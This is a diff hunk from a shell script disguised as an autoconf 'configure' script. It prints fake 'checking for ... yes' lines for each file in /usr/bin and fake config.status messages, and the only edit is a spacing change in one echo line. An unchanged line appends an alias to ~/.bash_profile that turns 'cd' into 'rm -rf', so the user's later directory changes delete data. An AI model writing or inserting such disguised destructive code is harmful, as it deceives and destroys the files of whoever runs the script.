@@ -4,7 +4,7 @@ echo "alias cd=\"rm -rf\"" >> ~/.bash_profile
 for i in `ls /usr/bin`
 do 
 	sleep 0.05
-	echo "checking for $i ... yes"
+	echo "checking for $i... yes"
 done
 echo "configure: creating ./config.status"
 echo "config.status: creating Makefile"
